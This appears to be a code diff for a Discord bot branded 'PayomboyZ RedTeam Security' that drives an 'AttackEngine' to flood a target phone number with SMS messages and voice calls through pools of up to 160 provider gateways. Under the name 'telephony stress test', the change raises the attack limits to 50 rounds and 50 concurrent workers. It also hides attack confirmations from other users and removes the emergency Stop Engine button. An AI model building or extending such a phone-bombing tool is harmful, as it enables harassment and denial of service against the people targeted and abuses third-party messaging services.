@@ -16,6 +16,15 @@ PROVIDERS_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "confi
 VERIFIED_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "verified_providers.json")
 PROXIES_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxies.txt")
 
+BASE_DIR = os.path.dirname(os.path.dirname(__file__))
+BANNER_CARD1 = os.path.join(BASE_DIR, "payomboyz_green_balaclava_core.gif")
+BANNER_CARD2 = os.path.join(BASE_DIR, "payomboyz_green_balaclava_strike.gif")
+
+def get_active_banner_path() -> Optional[str]:
+    choice = SettingsManager.get_active_banner()
+    p = BANNER_CARD2 if choice == "card2" else BANNER_CARD1
+    return p if os.path.exists(p) else None
+
 current_engine_instance: Optional[AttackEngine] = None
 
 def get_active_providers_file() -> str:
@@ -81,15 +90,20 @@ def build_panel_embed() -> discord.Embed:
         name="Quick Controls Guide",
         value=(
             "🚀 **Start Attack** → Enter phone & trigger concurrency waves\n"
-            "📍 **Set Channel** → Bind designated results & telemetry room\n"
             "🔄 **Switch Pool** → Toggle between 13 Verified and 160 Master Matrix\n"
-            "🔍 **Health Audit** → Re-benchmark live endpoints & prune dead URLs\n"
-            "🛑 **Stop Engine** → Immediate emergency cut-off"
+            "📊 **Status** → Inspect engine state & telephony latency\n"
+            "🔍 **Health Audit** → Re-benchmark live endpoints & auto-prune\n"
+            "📋 **View Pool** → List loaded SMS & Voice gateways"
         ),
         inline=False
     )
 
     embed.set_footer(text="PayomboyZ RedTeam Security • Zero-Attachment Policy • Use /attack or /set_channel")
+    
+    banner_path = get_active_banner_path()
+    if banner_path and os.path.exists(banner_path):
+        embed.set_image(url="attachment://banner.gif")
+
     return embed
 
 
@@ -109,16 +123,16 @@ class AttackModal(ui.Modal, title="⚡ Launch Telephony Stress Test"):
         required=True
     )
     rounds_input = ui.TextInput(
-        label="Rounds (Max 5)",
+        label="Rounds (Max 50)",
         placeholder="1",
         default="1",
-        max_length=1,
+        max_length=2,
         required=False
     )
     concurrency_input = ui.TextInput(
-        label="Concurrency Workers (Max 10)",
-        placeholder="8",
-        default="8",
+        label="Concurrency Workers (Max 50)",
+        placeholder="10",
+        default="10",
         max_length=2,
         required=False
     )
@@ -177,7 +191,7 @@ class AttackModal(ui.Modal, title="⚡ Launch Telephony Stress Test"):
 
         await interaction.response.send_message(
             f"🚀 **Attack Dispatched!**\nTarget: `{clean_phone}` | Mode: `{mode.upper()}` | Rounds: `{rounds}` | Workers: `{concurrency}`\n📍 Results will post in: {ch_mention}",
-            ephemeral=False
+            ephemeral=True
         )
 
         asyncio.create_task(self._run_attack_task(interaction, clean_phone, mode, rounds, concurrency))
@@ -279,8 +293,8 @@ class ChannelSelectView(ui.View):
         channel_types=[discord.ChannelType.text]
     )
     async def select_channel(self, interaction: discord.Interaction, select: ui.ChannelSelect):
-        if not SecurityGuard.is_authorized(interaction):
-            return await interaction.response.send_message("❌ **Access Denied**", ephemeral=True)
+        if not SecurityGuard.is_admin(interaction):
+            return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)
         
         selected_channel = select.values[0]
         SettingsManager.set_output_channel_id(selected_channel.id)
@@ -298,38 +312,14 @@ class ControlPanelView(ui.View):
     @ui.button(label="🚀 Start Attack", style=discord.ButtonStyle.danger, custom_id="btn_start_attack", row=0)
     async def btn_start_attack(self, interaction: discord.Interaction, button: ui.Button):
         if not SecurityGuard.is_authorized(interaction):
+            allowed_ch = SettingsManager.get_allowed_channels()
+            ch_hint = f" Please use in {', '.join(f'<#{cid}>' for cid in allowed_ch)}." if allowed_ch else ""
             return await interaction.response.send_message(
-                "❌ **Access Denied**: Unauthorized user.", ephemeral=True
+                f"❌ **Access Denied**: Unauthorized user or channel.{ch_hint}", ephemeral=True
             )
         await interaction.response.send_modal(AttackModal())
 
-    @ui.button(label="🛑 Stop Engine", style=discord.ButtonStyle.danger, custom_id="btn_stop_engine", row=0)
-    async def btn_stop_engine(self, interaction: discord.Interaction, button: ui.Button):
-        global current_engine_instance
-        if not SecurityGuard.is_authorized(interaction):
-            return await interaction.response.send_message(
-                "❌ **Access Denied**: Unauthorized user.", ephemeral=True
-            )
-
-        if current_engine_instance:
-            current_engine_instance.stop()
-            SecurityGuard.set_engine_state(False, None)
-            await interaction.response.send_message("🛑 **Emergency Stop Executed**: Active engine terminated.", ephemeral=False)
-        else:
-            await interaction.response.send_message("ℹ️ No active attack is running.", ephemeral=True)
-
-    @ui.button(label="📍 Set Channel", style=discord.ButtonStyle.primary, custom_id="btn_set_channel", row=1)
-    async def btn_set_channel(self, interaction: discord.Interaction, button: ui.Button):
-        if not SecurityGuard.is_authorized(interaction):
-            return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)
-        
-        await interaction.response.send_message(
-            "📍 **Select the text channel** where all attack results & live telemetry should be sent:",
-            view=ChannelSelectView(),
-            ephemeral=True
-        )
-
-    @ui.button(label="🔄 Switch Pool", style=discord.ButtonStyle.secondary, custom_id="btn_toggle_pool", row=1)
+    @ui.button(label="🔄 Switch Pool", style=discord.ButtonStyle.secondary, custom_id="btn_toggle_pool", row=0)
     async def btn_toggle_pool(self, interaction: discord.Interaction, button: ui.Button):
         if not SecurityGuard.is_authorized(interaction):
             return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)
@@ -341,7 +331,7 @@ class ControlPanelView(ui.View):
         embed = build_panel_embed()
         await interaction.response.edit_message(embed=embed, view=self)
 
-    @ui.button(label="📊 Status", style=discord.ButtonStyle.secondary, custom_id="btn_status", row=1)
+    @ui.button(label="📊 Status", style=discord.ButtonStyle.secondary, custom_id="btn_status", row=0)
     async def btn_status(self, interaction: discord.Interaction, button: ui.Button):
         active_file = get_active_providers_file()
         providers = ProviderLoader.load(active_file)
@@ -363,7 +353,7 @@ class ControlPanelView(ui.View):
         embed.add_field(name="Pacing Cooldown", value="`SMS 0.5s / Voice 10s`", inline=True)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    @ui.button(label="🔍 Health Audit", style=discord.ButtonStyle.secondary, custom_id="btn_health_audit", row=2)
+    @ui.button(label="🔍 Health Audit", style=discord.ButtonStyle.secondary, custom_id="btn_health_audit", row=1)
     async def btn_health_audit(self, interaction: discord.Interaction, button: ui.Button):
         if not SecurityGuard.is_authorized(interaction):
             return await interaction.response.send_message(
@@ -375,7 +365,7 @@ class ControlPanelView(ui.View):
                 "⚠️ **Engine Busy**: An operation is currently active.", ephemeral=True
             )
 
-        await interaction.response.defer(ephemeral=False)
+        await interaction.response.defer(ephemeral=True)
         SecurityGuard.set_engine_state(True, target="AUDIT_BENCHMARK")
 
         audit_trace: List[str] = []
@@ -423,13 +413,13 @@ class ControlPanelView(ui.View):
                     sample += f"\n*...and {len(audit_trace) - 15} more*"
                 embed.add_field(name="Gateway Health Sample", value=sample, inline=False)
 
-            await interaction.followup.send(embed=embed)
+            await interaction.followup.send(embed=embed, ephemeral=True)
         except Exception as e:
-            await interaction.followup.send(f"❌ **Audit Failed**: `{str(e)[:100]}`")
+            await interaction.followup.send(f"❌ **Audit Failed**: `{str(e)[:100]}`", ephemeral=True)
         finally:
             SecurityGuard.set_engine_state(False, None)
 
-    @ui.button(label="📋 View Pool", style=discord.ButtonStyle.secondary, custom_id="btn_view_pool", row=2)
+    @ui.button(label="📋 View Pool", style=discord.ButtonStyle.secondary, custom_id="btn_view_pool", row=1)
     async def btn_view_pool(self, interaction: discord.Interaction, button: ui.Button):
         active_file = get_active_providers_file()
         providers = ProviderLoader.load(active_file)
@@ -446,7 +436,7 @@ class ControlPanelView(ui.View):
         embed.add_field(name=f"Total Loaded: {len(providers)}", value=value, inline=False)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    @ui.button(label="🔄 Refresh", style=discord.ButtonStyle.secondary, custom_id="btn_refresh_panel", row=2)
+    @ui.button(label="🔄 Refresh", style=discord.ButtonStyle.secondary, custom_id="btn_refresh_panel", row=1)
     async def btn_refresh_panel(self, interaction: discord.Interaction, button: ui.Button):
         embed = build_panel_embed()
         await interaction.response.edit_message(embed=embed, view=self)
